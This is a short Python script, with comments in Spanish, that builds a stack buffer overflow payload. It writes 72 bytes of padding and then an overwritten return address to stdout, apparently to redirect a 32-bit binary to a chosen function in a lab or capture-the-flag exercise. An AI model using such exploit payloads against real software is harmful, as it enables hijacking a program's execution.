from struct import pack
import sys

# Construccion del padding
padding = b"A" * 72

# Direccion de retorno
fun_addr = pack("<I", 0x565561d1) # b"\xd1\x61\x55\x56" 

# Construccion del payload
payload = padding + fun_addr 

# Envio del payload
sys.stdout.buffer.write(payload)